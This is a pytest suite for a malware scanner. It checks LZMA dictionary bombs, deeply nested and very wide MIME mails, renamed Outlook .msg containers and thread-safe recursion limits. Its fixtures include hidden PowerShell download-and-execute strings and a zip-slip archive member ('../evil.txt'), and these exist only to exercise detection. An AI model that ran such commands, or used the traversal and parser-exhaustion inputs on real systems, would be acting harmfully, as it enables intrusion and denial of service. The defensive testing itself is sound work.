def test_swf_zws_dict_bomb_rejected_before_decompress():
    """SEC-033: ein 1-GiB-Wörterbuch wird am Header erkannt, nicht allokiert."""
    lzma_header = b"\x5d" + (1024**3).to_bytes(4, "little")
    compressed = b"ZWS\x09" + b"\x00" * 4 + lzma_header + b"\x00" * 80
    members = list(iter_swf_payloads(compressed))
    assert members and "Wörterbuch" in members[0][2]
    assert members[0][1] == b""


def test_swf_lzma_decompressor_gets_a_memlimit(monkeypatch):
    """SEC-033: auch ohne Header-Pfad ist der Decoder-Speicher begrenzt."""
    import lzma

    captured: dict = {}
    real = lzma.LZMADecompressor

    class _Spy:
        def __init__(self, *args, **kwargs):
            captured.update(kwargs)
            self._inner = real(*args, **kwargs)

        def decompress(self, *args, **kwargs):
            return self._inner.decompress(*args, **kwargs)

        @property
        def eof(self):
            return self._inner.eof

    monkeypatch.setattr(lzma, "LZMADecompressor", _Spy)
    payload = b"FWS\x09" + b"payload content"
    compressed = b"ZWS\x09" + b"\x00" * 4 + lzma.compress(payload)
    members = list(iter_swf_payloads(compressed))
    assert members and members[0][1] == payload
    assert captured.get("memlimit")


def test_swf_end_to_end_dispatcher(dispatcher):
    import zlib

    payload = b"FWS\x09" + b"\x00" * 10 + b"powershell -encodedcommand downloadstring"
    compressed = b"CWS\x09" + b"\x00" * 4 + zlib.compress(payload)
    fd, path = tempfile.mkstemp(suffix=".swf")
    os.write(fd, compressed)
    os.close(fd)
    try:
        r = dispatcher.scan_path(path)
    finally:
        os.unlink(path)
    assert r.detected_type == "swf"
    assert len(r.children) == 1
    # Decompressed content is scanned -> suspicious strings found.
    assert any(i.rule_id == "GEN_SUSPICIOUS_STRINGS" for i in r.children[0].indicators)


# -- real-world Outlook fixture (optional) ----------------------------------- #
#
# tests/data/unicode_attachments.msg is a REAL Outlook .msg file (from the
# msg-extractor project, GPL-3.0) with two TIF attachments. It is NOT shipped
# in the repository (license/trust); developers can fetch it manually:
#
#   curl -o tests/data/unicode_attachments.msg \
#     https://raw.githubusercontent.com/TeamMsgExtractor/msg-extractor/master/example-msg-files/unicode.msg
#
# The test skips when the file is absent, so the suite stays deterministic
# and offline.

@pytest.mark.skipif(
    not os.path.exists(os.path.join(os.path.dirname(__file__), "data", "unicode_attachments.msg")),
    reason="echtes .msg-Fixture fehlt (siehe Kommentar)",
)
def test_real_outlook_msg_attachments_extracted():
    import os as _os

    path = _os.path.join(_os.path.dirname(__file__), "data", "unicode_attachments.msg")
    data = Path(path).read_bytes()
    members = list(iter_email_attachments(data, "msg"))
    by_name = {name: (payload, err) for name, payload, err in members}
    assert by_name["importOl.tif"][1] is None
    assert by_name["raisedva.tif"][1] is None
    assert by_name["importOl.tif"][0].startswith(b"\x49\x49")  # TIFF-Magic
    assert len(by_name) == 2


@pytest.mark.skipif(
    not os.path.exists(os.path.join(os.path.dirname(__file__), "data", "unicode_attachments.msg")),
    reason="echtes .msg-Fixture fehlt (siehe Kommentar)",
)
def test_real_outlook_msg_end_to_end(dispatcher):
    import os as _os

    path = _os.path.join(_os.path.dirname(__file__), "data", "unicode_attachments.msg")
    fd, tmp = tempfile.mkstemp(suffix=".msg")
    os.close(fd)
    try:
        import shutil

        shutil.copyfile(path, tmp)
        r = dispatcher.scan_path(tmp)
    finally:
        os.unlink(tmp)
    assert r.detected_type == "ole"
    names = {c.display_name for c in r.children}
    assert "importOl.tif" in names
    assert "raisedva.tif" in names


@pytest.mark.skipif(
    not os.path.exists(os.path.join(os.path.dirname(__file__), "data", "unicode_attachments.msg")),
    reason="echtes .msg-Fixture fehlt (siehe Kommentar)",
)
def test_real_outlook_msg_preview():
    """The property-stream IDs against a REAL Outlook file.

    The hand-built CFB above pins the container layout; this pins the PidTag
    ids (0037/0C1A/5D01/0E04/1000) against a file Outlook actually wrote —
    a renamed or re-encoded field would silently empty the preview otherwise.
    """
    import os as _os

    from malaz.core.mail_view import render_msg

    path = _os.path.join(_os.path.dirname(__file__), "data", "unicode_attachments.msg")
    text = render_msg(Path(path).read_bytes())
    assert "Betreff: Test for TIF files" in text
    assert "Brian Zhou <brizhou@gmail.com>" in text
    assert "An: brianzhou@me.com" in text
    assert "MS Outlook MSG Extractor" in text  # Text body
    assert "importOl.tif" in text and "raisedva.tif" in text


def _wrap_multipart(blob: bytes, layers: int) -> bytes:
    for i in range(layers):
        boundary = f"b{i}".encode()
        blob = (
            b"Content-Type: multipart/mixed; boundary=" + boundary + b"\r\n\r\n"
            b"--" + boundary + b"\r\n"
            + blob
            + b"\r\n--" + boundary + b"--\r\n"
        )
    return blob


def test_eml_deeply_nested_multipart_no_crash():
    # Regression: sowohl message.walk() ALS AUCH der email-Parser selbst
    # rekursionieren — ~1200+ Schichten warfen RecursionError. Beides muss
    # abgefangen werden: die Extraktion terminiert IMMER mit einem
    # Ergebnis (Fehlernote oder Anhänge), nie mit einem Crash.
    inner = b"Content-Type: text/plain\r\n\r\ntiefster Teil"
    # 50 Schichten: der Parser schafft das; unsere Tiefengrenze (16) muss
    # die überschrittenen Schichten sichtbar melden.
    members = list(iter_email_attachments(_wrap_multipart(inner, 50), "eml"))
    notes = [err for _n, _p, err in members if err]
    assert any("Verschachtelung" in (e or "") for e in notes), members[:3]

    # 1500 Schichten: der Parser stirbt hier nicht mehr — seit Runde 5 liegt
    # ``sys.setrecursionlimit`` bei ``ole_depth.HARD_MAX_FRAMES`` statt bei
    # 1000 (siehe ``ole_depth.ensure_walk_limit``), und der stdlib-Parser
    # braucht etwa einen Frame je Schicht. Die Zusage bleibt dieselbe: ein
    # Ergebnis, keine Ausnahme, und die uebersprungenen Schichten schweigen
    # nicht.
    members = list(iter_email_attachments(_wrap_multipart(inner, 1500), "eml"))
    assert members, "tiefe Verschachtelung muss als Eintrag enden"
    assert members[0][2], "die uebersprungenen Schichten duerfen nicht schweigen"
    assert "Verschachtelung" in members[0][2]


# -- Parser-Tiefenbudget (Befund Runde 6) ------------------------------------ #
#
# Runde 5 hebt ``sys.setrecursionlimit`` beim Import von ``core/ole_depth``
# auf ``HARD_MAX_FRAMES`` (8192) — beabsichtigt fuer olefile, aber der
# stdlib-MIME-Parser hatte bis dahin nur dieses Interpreter-Limit als
# Tiefengrenze, und seine Kosten wachsen quadratisch mit der
# Verschachtelung. Gemessen an identischen Bytes im venv: 128 Schichten
# 0,078 s / 256 0,172 s / 512 0,422 s / 2048 3,735 s / 8000 49,875 s. Beide
# .eml-Pfade (``iter_email_attachments`` UND ``eml_analysis.parse_mail``)
# parsen dieselben Bytes; gemessen 1500 Schichten: 2,25 s + 2,2 s.
# Deshalb wird VOR dem Parse geschaetzt und jenseits des Budgets gewichtet
# abgelehnt — ``_MAX_MIME_LAYERS`` in ``core.email_extract``.

_EML_BUDGET_HEADERS = (
    b"From: a@example.com\r\nTo: b@example.com\r\n"
    b"Subject: Rechnung\r\nMessage-ID: <tiefe@example.com>\r\n"
    b"Received: from mail.example.com\r\n"
)


def _deep_budget_mail(layers: int, inner: bytes | None = None) -> bytes:
    """A real-looking mail with ``layers`` nested multipart/mixed frames."""
    if inner is None:
        inner = b"Content-Type: text/plain\r\n\r\nRechnung im Anhang"
    return _EML_BUDGET_HEADERS + _wrap_multipart(inner, layers)


def test_eml_beyond_the_nesting_budget_is_refused_without_parsing():
    """Der Parser darf fuer eine zu tiefe Mail gar nicht erst laufen.

    Vor dem Fix: 2048 Schichten = 3,7 s in DIESEM Aufruf (und noch einmal
    dieselbe Zeit in ``eml_analysis``). Nach dem Fix kostet die Ablehnung
    nichts Messbares, weil nur die Delimiter-Zeilen gezaehlt werden.
    """
    members = list(iter_email_attachments(_deep_budget_mail(2048), "eml"))
    assert len(members) == 1, members[:3]
    note = members[0][2]
    assert note and "Verschachtelung" in note, members[:3]
    assert "NICHT analysiert" in note, note


def test_eml_nesting_budget_holds_the_runtime():
    """Die Zusage ist eine Laufzeit, nicht eine Annahme (``time.monotonic``)."""
    data = _deep_budget_mail(2048)
    started = time.monotonic()
    list(iter_email_attachments(data, "eml"))
    elapsed = time.monotonic() - started
    # Vor dem Fix 3,7 s (gemessen), Budget selbst 0,17 s bei 256 Schichten.
    assert elapsed < 1.5, f"Parser lief trotz Budget: {elapsed:.2f}s"


def test_unparsed_deep_eml_stays_weighted_end_to_end(dispatcher):
    """Ein nicht geparstes .eml darf nie GRUEN ergeben — beide Pfade zaehlen."""
    started = time.monotonic()
    result = _scan(dispatcher, _deep_budget_mail(2048), ".eml")
    elapsed = time.monotonic() - started
    assert elapsed < 2.0, f"Scan eines zu tiefen .eml: {elapsed:.2f}s"
    assert result.detected_type == "eml"
    assert result.risk_level != RiskLevel.GREEN
    assert result.score >= 25
    weighted = [
        (i.rule_id, i.weight)
        for c in result.children
        for i in c.indicators
        if i.weight
    ]
    assert ("EMAIL_PARSE_ERROR", 25) in weighted, weighted


def test_eml_analysis_refuses_the_same_mail_with_the_same_reason():
    """Der zweite Parser-Pfad benutzt dasselbe Praedikat, keine zweite Grenze."""
    from malaz.core.eml_analysis import parse_mail

    deep = _deep_budget_mail(2048)
    facts = parse_mail(deep)
    assert facts.parse_error, "parse_mail muss die Tiefe ebenfalls ablehnen"
    assert "Verschachtelung" in facts.parse_error, facts.parse_error
    # Innerhalb des Budgets bleibt derselbe Aufruf ein normaler Parse.
    assert parse_mail(_deep_budget_mail(16)).parse_error == ""


def test_wide_shallow_mail_is_not_mistaken_for_deep_nesting():
    """Gegenrichtung: Breite und Zitate sind keine Verschachtelung.

    400 Zeilen, die wie ``--flags`` aussehen (Diff, Optionsliste, ASCII-Art)
    duerfen das Budget nicht ausloesen — nur deklarierte ``boundary=``-Tokens
    zaehlen.
    """
    body = "\n".join(f"--flag-{i} ist keine Struktur" for i in range(400))
    data = _eml([("note.txt", b"hi")], body=body)
    members = list(iter_email_attachments(data, "eml"))
    assert not any(
        err and "nicht geparst" in err for _n, _p, err in members
    ), members[:3]
    assert any(
        name == "note.txt" and err is None for name, _p, err in members
    ), members[:3]


def test_forwarded_mail_within_the_budget_is_still_parsed():
    """Gegenrichtung: ein mehrfach weitergeleiteter Thread bleibt lesbar."""
    inner = _eml([("rechnung.pdf", b"%PDF-1.7\n%%EOF")])
    members = list(iter_email_attachments(_wrap_multipart(inner, 12), "eml"))
    names = [name for name, _p, err in members if err is None]
    assert "rechnung.pdf" in names, members[:3]
    notes = [err for _n, _p, err in members if err]
    assert not any("nicht geparst" in n for n in notes), notes


def test_mail_just_below_the_budget_is_parsed_not_refused():
    """Die Grenze liegt dort, wo sie deklariert ist — nicht darunter."""
    from malaz.core import email_extract

    below = email_extract.mime_depth_note(
        _deep_budget_mail(email_extract._MAX_MIME_LAYERS - 1)
    )
    above = email_extract.mime_depth_note(
        _deep_budget_mail(email_extract._MAX_MIME_LAYERS + 1)
    )
    assert below is None
    assert above and "Verschachtelung" in above


def test_zip_of_deep_mails_stays_within_the_time_budget(dispatcher):
    """Der Befund in seiner Verstaerkerform: viele tiefe .eml in EINEM Archiv.

    Gemessen vor dem Fix: vier Mitglieder mit 2048 Schichten brauchen ~30 s
    im Scan, acht mit 8000 Schichten 604 s bei 481 KB Archivgroesse (weit
    unter ``MAX_FILE_SIZE``, ohne Zeitbudget pro Datei, drei Scan-Worker
    parallel). Nach dem Fix: 4x2048 = 0,14 s, 8x8000 = 0,87 s.
    """
    import zipfile

    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        for i in range(4):
            zf.writestr(f"m{i}.eml", _deep_budget_mail(2048))
    started = time.monotonic()
    result = _scan(dispatcher, buf.getvalue(), ".zip")
    elapsed = time.monotonic() - started
    assert elapsed < 3.0, f"Archiv mit tiefen Mails: {elapsed:.2f}s"
    assert result.risk_level != RiskLevel.GREEN
    nested_ids = {
        i.rule_id
        for child in result.children
        for grand in child.children
        for i in grand.indicators
        if i.weight
    }
    assert "EMAIL_PARSE_ERROR" in nested_ids, nested_ids


# -- Parser-BREITENBUDGET (Befund Runde 7) ----------------------------------- #
#
# Der zweite Kostentreiber desselben Parsers ist die Breite: die Kosten sind
# linear in der Teilzahl, aber die Konstante ist gross. Gemessen im venv ueber
# ``Dispatcher.scan_path`` (beide .eml-Stufen parsen dieselben Bytes): 1000
# Teile 0,672 s / 5000 2,844 s / 20 000 10,453 s / 60 000 29,594 s = 0,49 ms
# je Teil. Begrenzt war die Teilzahl nur durch ``MAX_READ_SIZE`` (100 MB) —
# rund 1,8 Mio Teile, also ~13 Minuten fuer EINE Datei; die
# ``MAX_ARCHIVE_ENTRIES``-Kappung der Extraktion half nicht, weil
# ``BytesParser.parsebytes`` vorher ueber alle Teile laeuft. In der
# Verstaerkerform (dieselbe wie beim Tiefen-Befund) kostet eine 4-KB-ZIP mit
# einer 20 000-Teile-Mail 10 s und eine 32-KB-ZIP mit acht davon 78,7 s —
# 2,5 s Rechenzeit je Angreifer-Kilobyte gegen 0,19 s/KB der ZIP-Bombe, die
# ``MAX_UNCOMPRESSED_SIZE`` bewusst zulaesst.
#
# ``_MAX_MIME_PARTS = 4096`` ist gegen echte Post gewaehlt, nicht gegen den
# Angriff: die breiteste Mail beider Korpora hat 5 Teile, ein Verteiler mit
# 500 Teilen kostet 0,33 s. Am Budget liegt der schlimmste Fall bei ~2 s —
# unter den 3,3 s, die der Scanner fuer eine 100 MB grosse Textdatei ohnehin
# ausgibt.

_WIDE_MAIL_HEAD = (
    b"From: newsletter@example.com\r\nTo: kunde@example.com\r\n"
    b"Subject: Verteiler\r\nMessage-ID: <breite@example.com>\r\n"
    b"Received: from mail.example.com\r\n"
)


def _wide_mail(
    parts: int,
    boundary: bytes = b"verteiler-boundary",
    decl: bytes | None = None,
    attach: bool = False,
) -> bytes:
    """A flat multipart/mixed mail: one shared boundary, ``parts`` parts.

    ``boundary`` is the delimiter token, ``decl`` the (default: identical)
    ``boundary=`` value of the Content-Type header.
    """
    decl = boundary if decl is None else decl
    chunks = [
        _WIDE_MAIL_HEAD,
        b"Content-Type: multipart/mixed; boundary=" + decl + b"\r\n\r\n",
        b"--" + boundary + b"\r\n",
    ]
    for i in range(parts):
        if attach:
            chunks.append(
                b"Content-Type: text/plain\r\n"
                b'Content-Disposition: attachment; filename="teil'
                + str(i).encode()
                + b'.txt"\r\n\r\nhallo welt\r\n--'
                + boundary
                + b"\r\n"
            )
        else:
            chunks.append(b"Content-Type: text/plain\r\n\r\nhallo welt\r\n--" + boundary + b"\r\n")
    chunks.append(b"--\r\n")
    return b"".join(chunks)


def test_wide_flat_mail_beyond_the_part_budget_is_refused_without_parsing():
    """Der Parser darf fuer eine zu breite Mail gar nicht erst laufen.

    Vor dem Fix: 4097 Teile = 1,1 s in DIESEM Aufruf (und dieselbe Zeit noch
    einmal in ``eml_analysis``), ohne jede Meldung. Nach dem Fix kostet die
    Ablehnung nichts Messbares, weil nur die Delimiter-Zeilen gezaehlt werden.
    """
    # 20 000 Teile: weit jenseits jedes plausiblen Budgets (4096) und
    # unabhaengig von der Konstante — vor dem Fix gemessen 10,5 s.
    data = _wide_mail(20_000)
    started = time.monotonic()
    members = list(iter_email_attachments(data, "eml"))
    elapsed = time.monotonic() - started
    assert len(members) == 1, members[:3]
    note = members[0][2]
    assert note and "MIME-Teile" in note, members[:3]
    assert "NICHT analysiert" in note, note
    assert elapsed < 0.5, f"Parser lief trotz Breitenbudget: {elapsed:.2f}s"


def test_mail_just_below_the_part_budget_is_parsed_not_refused():
    """Die Grenze liegt dort, wo sie deklariert ist — nicht darunter."""
    from malaz.core import email_extract

    budget = email_extract._MAX_MIME_PARTS
    # ``_wide_mail(n)`` erzeugt n+1 Delimiter der deklarierten Boundary.
    assert email_extract.mime_depth_note(_wide_mail(budget - 1)) is None
    above = email_extract.mime_depth_note(_wide_mail(budget))
    assert above and "MIME-Teile" in above, above


def test_realistic_wide_mail_stays_parsed_with_all_attachments():
    """Gegenrichtung: ein Verteiler/Newsletter bleibt vollstaendig lesbar.

    Ein Newsletter mit 200 Teilen ist normale Post; die Grenze darf ihn nicht
    umkippen. Vor dem Fix und nach dem Fix identisch gruen — dieser Test ist
    die Ueberkorrektur-Bremse, nicht der Regressionstest.
    """
    members = list(iter_email_attachments(_wide_mail(200, attach=True), "eml"))
    names = [name for name, _p, err in members if err is None]
    assert len(names) == 200, members[:3]
    assert names[0] == "teil0.txt" and names[-1] == "teil199.txt"
    assert not any(err and "nicht geparst" in err for _n, _p, err in members)


def test_long_boundary_cannot_hide_the_parts():
    """Eine ueberlange Boundary darf die Schatzung nicht ausschalten.

    Der stdlib-Parser benutzt das volle Token (gemessen: eine 2000-Teile-Mail
    mit 71-Zeichen-Boundary wird in 0,45 s geparst), die Deklaration wurde aber
    auf 70 Zeichen gekuerzt — vorher passte kein Delimiter mehr auf die
    Deklaration und die Schaetzung sah Tiefe 0. Jetzt werden beide Seiten auf
    dieselbe Laenge geschnitten.
    """
    from malaz.core import email_extract

    long_boundary = b"b" * 71
    data = _wide_mail(20_000, boundary=long_boundary)
    note = email_extract.mime_depth_note(data)
    assert note and "MIME-Teile" in note, note
    members = list(iter_email_attachments(data, "eml"))
    assert len(members) == 1 and members[0][2], members[:3]


def test_quoted_boundary_with_semicolon_cannot_hide_the_parts():
    """``boundary="x;y"`` ist gueltig (der Parser trennt daran) und zaehlt mit."""
    from malaz.core import email_extract

    data = _wide_mail(20_000, boundary=b"x;y", decl=b'"x;y"')
    note = email_extract.mime_depth_note(data)
    assert note and "MIME-Teile" in note, note


def test_unparsed_wide_eml_stays_weighted_end_to_end(dispatcher):
    """Ein nicht geparstes breites .eml darf nie GRUEN ergeben — beide Pfade."""
    data = _wide_mail(20_000, attach=True)
    # CPU time, not wall clock: the fixture is written to %TEMP%, and the
    # anti-virus real-time scanner inspects every file created there. That
    # added 0.6-0.7 s of wall time on the build machine (measured: 1.36 s CPU
    # against 2.05-2.42 s wall for the same scan), which says nothing about
    # the parser the guard is meant to protect. The generous wall bound below
    # still catches a genuine hang.
    cpu_started = time.process_time()
    wall_started = time.monotonic()
    result = _scan(dispatcher, data, ".eml")
    cpu = time.process_time() - cpu_started
    wall = time.monotonic() - wall_started
    assert cpu < 2.0, f"Scan einer zu breiten .eml: {cpu:.2f}s CPU"
    assert wall < 15.0, f"Scan einer zu breiten .eml: {wall:.2f}s Wanduhr"
    assert result.detected_type == "eml"
    assert result.risk_level != RiskLevel.GREEN
    assert result.score >= 25
    weighted = [
        (i.rule_id, i.weight)
        for c in result.children
        for i in c.indicators
        if i.weight
    ]
    assert ("EMAIL_PARSE_ERROR", 25) in weighted, weighted


def test_eml_analysis_refuses_the_same_wide_mail_with_the_same_reason():
    """Der zweite Parser-Pfad benutzt dasselbe Praedikat, keine zweite Grenze."""
    from malaz.core.eml_analysis import parse_mail

    wide = _wide_mail(20_000)
    facts = parse_mail(wide)
    assert facts.parse_error, "parse_mail muss die Breite ebenfalls ablehnen"
    assert "MIME-Teile" in facts.parse_error, facts.parse_error
    # Innerhalb des Budgets bleibt derselbe Aufruf ein normaler Parse.
    assert parse_mail(_wide_mail(200)).parse_error == ""


def test_zip_of_wide_mails_stays_within_the_time_budget(dispatcher):
    """Der Befund in seiner Verstaerkerform: viele breite .eml in EINEM Archiv.

    Gemessen vor dem Fix: eine 4-KB-ZIP mit EINER 20 000-Teile-Mail braucht
    10 s, acht davon 78,7 s. Nach dem Fix kostet jedes Mitglied nur die
    Delimiter-Zaehlung.
    """
    import zipfile

    member = _wide_mail(20_000, attach=True)
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        for i in range(2):
            zf.writestr(f"m{i}.eml", member)
    started = time.monotonic()
    result = _scan(dispatcher, buf.getvalue(), ".zip")
    elapsed = time.monotonic() - started
    # Grenze nach einer REGEL, nicht nach Gefuehl: sie muss weit unter dem
    # Fehlerwert liegen und bequem ueber dem Istwert. Der Fehler war 10 s
    # (eine breite Mail) bzw. 78,7 s (acht) — der Fix kostet Millisekunden.
    # 3,0 s war nur rund das Dreifache des Istwerts und wurde im vollen
    # Testlauf unter Last rot (gemessen 3,39 s, isoliert 0,2 s); 8,0 s trennt
    # den Fehler weiterhin um mehr als das Zehnfache.
    assert elapsed < 8.0, f"Archiv mit breiten Mails: {elapsed:.2f}s"
    assert result.risk_level != RiskLevel.GREEN
    nested_ids = {
        i.rule_id
        for child in result.children
        for grand in child.children
        for i in grand.indicators
        if i.weight
    }
    assert "EMAIL_PARSE_ERROR" in nested_ids, nested_ids


def test_eml_parser_crash_becomes_a_note(monkeypatch):
    """Ein werfender Parser wird zu einer Meldung, nicht zu einem Absturz.

    Die Tiefe allein loest den Zweig nicht mehr aus (das Prozesslimit liegt
    seit Runde 5 ueber der Tiefe, in der der stdlib-Parser stirbt), also wird
    der Parser selbst zum Werfen gebracht. Geprueft wird die Uebersetzung in
    eine Fehlernote — nicht das Wurfverhalten der stdlib.
    """
    from malaz.core import email_extract

    class Boom:
        def __init__(self, *args, **kwargs):
            pass

        def parsebytes(self, *args, **kwargs):
            raise RecursionError("maximum recursion depth exceeded")

    monkeypatch.setattr(email_extract, "BytesParser", Boom)
    members = list(
        iter_email_attachments(b"Content-Type: text/plain\r\n\r\nx", "eml")
    )
    assert len(members) == 1, members
    assert members[0][2] and "nicht parsebar" in members[0][2]


# -- Erweiterung UNBENANNTER Outlook-Container ------------------------------- #
#
# Die Erweiterung ist angreiferkontrolliert. Eine umbenannte .msg (oder ein
# .oft-Template, dasselbe CFB-Format) fiel vorher durch JEDEN Mail-Pfad:
# kein Preview UND keine Rekursion in __attach_*, ein darin liegendes
# ausfuehrbares Programm wurde also nie gescannt.


def test_renamed_msg_gets_preview_and_attachment_recursion(tmp_path):
    """Gemessen: eine .msg als .dat lieferte vorher 0 Kind-Scans."""
    from malaz.analysis.clamav import ClamAVScanner
    from malaz.analysis.windows_av import WindowsDefenderScanner
    from malaz.core.dispatcher import Dispatcher

    props = {
        "__substg1.0_0037001F": "Umbenannte MSG",
        "__substg1.0_1000001F": "Body-Text",
    }
    data = _build_msg_cfb([("evil.exe", b"MZ" + b"\x00" * 80)], properties=props)
    renamed = tmp_path / "harmlos.dat"  # Endung verraet nichts
    renamed.write_bytes(data)

    d = Dispatcher(
        av_scanner=WindowsDefenderScanner(enabled=False),
        clam_scanner=ClamAVScanner(enabled=False),
    )
    r = d.scan_path(renamed)
    assert r.mail_preview, "umbenannte .msg muss den Preview liefern"
    assert "Umbenannte MSG" in r.mail_preview
    assert r.children, "Anhang im umbenannten Container muss gescannt werden"
    assert any("evil.exe" in str(c.path) for c in r.children)


def _msg_props() -> dict[str, str]:
    return {
        "__substg1.0_0037001F": "Rechnung offen",
        "__substg1.0_1000001F": "Body-Text",
    }


def _zipslip_zip() -> bytes:
    """A ZIP whose only member escapes the extraction directory."""
    import zipfile

    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("../evil.txt", "powershell -nop -w hidden -enc SQBFAFgA")
    return buf.getvalue()


def test_deep_msg_directory_still_delivers_its_attachment(dispatcher):
    """Befund Runde 5: der dritte olefile-Aufrufer ohne ``walk_headroom``.

    Gemessen vorher ueber ``Dispatcher.scan_path``: dieselbe .msg mit
    angehaengtem ZIP scannt bei nesting 0 ROT 50 mit gescanntem Kind, ab 496
    Storage-Ebenen dagegen GELB 25 („.msg nicht lesbar: RecursionError") —
    obwohl ``probe_outlook_msg`` dieselben Bytes als lesbare Nachricht
    bestaetigt und der Preview Betreff und Anhangsnamen rendert. Das ist die
    Attrappe: die Datei gilt als gelesene Nachricht, ihr Inhalt wird aber nie
    geprueft.

    Der Verzeichnisdurchlauf steckt in olefiles Konstruktor, also braucht
    dieser Aufrufer dieselbe Freigabe wie die Office-Stufen und
    ``mail_view``: die tiefe Nachricht muss dasselbe Urteil bekommen wie die
    flache.
    """
    payload = _zipslip_zip()
    flat = _scan(
        dispatcher,
        _build_msg_cfb([("Anhang.zip", payload)], properties=_msg_props()),
        ".msg",
    )
    deep = _scan(
        dispatcher,
        _build_msg_cfb(
            [("Anhang.zip", payload)], properties=_msg_props(), nesting=496
        ),
        ".msg",
    )

    assert flat.children, "Vergleichsfall ohne Polsterung hat kein Kind"
    assert [c.display_name for c in deep.children] == [
        c.display_name for c in flat.children
    ], "der Anhang der gepolsterten .msg wurde nicht gescannt"
    deep_ids = {i.rule_id for i in deep.all_indicators()}
    assert "EMAIL_PARSE_ERROR" not in deep_ids, f"Container galt als unlesbar: {deep_ids}"
    assert deep.risk_level == flat.risk_level == RiskLevel.RED
    assert deep.score == flat.score


def test_a_parallel_walk_cannot_lose_its_headroom():
    """Befund Runde 5: das Limit wurde pro Durchlauf gehoben UND zurueckgesetzt.

    Gemessen vorher: 3 von 40 parallelen Scans (4 Threads) verloren ihre
    Tiefe an einen RecursionError, einfaeddig 0 von 10 — dieselben Bytes,
    dieselbe Tiefe, nur die Reihenfolge der Threads entschied. Mechanismus:
    Thread A hebt an, Thread B findet A's Limit fuer sich ausreichend und hebt
    nichts an, A verlaesst sein Fenster und setzt zurueck — B's noch laufender
    Durchlauf steht dann unter dem Ausgangslimit.

    Der Test erzwingt diese Reihenfolge mit zwei echten Faeden im
    ThreadPoolExecutor. A haelt ein Fenster offen; B tritt in sein eigenes ein,
    waehrend A's Limit gilt (B hebt damit nichts an), und laeuft erst, nachdem
    A zurueckgesetzt hat — genau das Fenster, in dem die Office-Stufen ihre
    DDE-Ebene verloren. B macht dabei denselben Durchlauf wie dort: ein
    olefile-Aufruf direkt im Fenster, ohne erneutes Anheben dazwischen.
    Geprueft wird das Beobachtbare: der Container wird gelesen.
    """
    import threading
    from concurrent.futures import ThreadPoolExecutor

    import olefile

    from malaz.core.ole_depth import directory_frames, walk_headroom

    payload = _zipslip_zip()
    # Tief genug, dass ein Durchlauf das Ausgangslimit (1000) reisst: gemessen
    # 1403 Frames fuer 700 Storage-Ebenen.
    deep = _build_msg_cfb(
        [("Anhang.zip", payload)], properties=_msg_props(), nesting=700
    )
    assert directory_frames(deep) > 1000, "Fixture reisst das Ausgangslimit nicht"

    a_inside = threading.Event()
    b_inside = threading.Event()
    a_left = threading.Event()

    def walker_a() -> None:
        # Das Fenster eines zweiten Scans, das gerade offen ist.
        with walk_headroom(4000):
            a_inside.set()
            assert b_inside.wait(30), "zweiter Faden trat nie ein"
        a_left.set()  # hier stand vorher das Zuruecksetzen des Limits

    def walker_b() -> list[tuple[str, ...]]:
        assert a_inside.wait(30), "erstes Fenster war nie offen"
        with walk_headroom(directory_frames(deep)):
            b_inside.set()
            assert a_left.wait(30), "erstes Fenster schloss nie"
            # Genau hier, unter dem Limit das beim Eintritt galt, laeuft der
            # olefile-Durchlauf (Konstruktor = build_storage_tree).
            ole = olefile.OleFileIO(io.BytesIO(deep))
            try:
                return ole.listdir(streams=True, storages=True)
            finally:
                ole.close()

    with ThreadPoolExecutor(max_workers=2) as pool:
        future_a = pool.submit(walker_a)
        future_b = pool.submit(walker_b)
        future_a.result(timeout=60)
        entries = future_b.result(timeout=60)

    flat = [path[-1] for path in entries]
    assert "__properties_version1.0" in flat, f"Container nicht gelesen: {entries}"
    assert any(path[0] == "__attach_v1.0_00000001" for path in entries), entries


def test_a_tree_beyond_the_ceiling_is_reported_not_swallowed():
    """Jenseits der Obergrenze ist der Inhalt ungeprueft — und das steht da.

    Die Stufe darf dort weder schweigen (kein Eintrag = "nichts gefunden")
    noch werfen: sie liefert genau eine Notiz mit dem Grund. Gemessen: 4200
    verschachtelte Storages sind 8403 Frames gegen eine Obergrenze von 8192.
    """
    from malaz.core.ole_depth import HARD_MAX_FRAMES, directory_frames

    data = _build_msg_cfb([("Anhang.zip", _zipslip_zip())], nesting=4200)
    assert directory_frames(data) > HARD_MAX_FRAMES

    members = list(iter_email_attachments(data, "msg"))
    assert len(members) == 1, members
    name, payload, error = members[0]
    assert not name and not payload
    assert error and "zu tief" in error, members


def test_parallel_msg_scans_all_reach_their_attachment(dispatcher):
    """Dieselbe Tiefe, mehrere Dateien gleichzeitig (wie der GUI-Worker).

    Der Mehrdatei-Scan laeuft ueber einen ThreadPoolExecutor mit EINEM
    Dispatcher — genau die Umgebung, in der die drei von 40 Auffaelligkeiten
    gemessen wurden. Hier muss jede der Dateien denselben Kind-Scan liefern
    wie einzeln gescannt.
    """
    from concurrent.futures import ThreadPoolExecutor

    payload = _zipslip_zip()
    ref = _scan(
        dispatcher,
        _build_msg_cfb([("Anhang.zip", payload)], properties=_msg_props(), nesting=700),
        ".msg",
    )
    assert ref.children, "Referenzlauf ohne Kinder"

    import os
    import tempfile

    paths: list[str] = []
    for i in range(8):
        fd, path = tempfile.mkstemp(suffix=f"_{i}.msg")
        os.write(
            fd,
            _build_msg_cfb(
                [("Anhang.zip", payload)], properties=_msg_props(), nesting=700
            ),
        )
        os.close(fd)
        paths.append(path)
    try:
        with ThreadPoolExecutor(max_workers=4) as pool:
            results = list(pool.map(dispatcher.scan_path, paths))
    finally:
        for path in paths:
            with suppress(OSError):
                os.unlink(path)

    for result in results:
        ids = {i.rule_id for i in result.all_indicators()}
        assert "EMAIL_PARSE_ERROR" not in ids, f"Container verlor die Tiefe: {ids}"
        assert [c.display_name for c in result.children] == [
            c.display_name for c in ref.children
        ]
        assert result.score == ref.score


def test_probe_outlook_msg_requires_the_property_table():
    """Der Diskriminator ist inhaltlich, nicht per Endung.

    Ein OLE-Container OHNE Property-Tabelle ist keine Nachricht (z. B. ein zu
    .msg umbenanntes .doc) — er darf keinen leeren, 'sauber' wirkenden
    Mail-Preview erzeugen.
    """
    from malaz.core.mail_view import probe_outlook_msg

    msg = _build_msg_cfb([], properties={"__substg1.0_0037001F": "X"})
    assert probe_outlook_msg(msg) == (True, "")
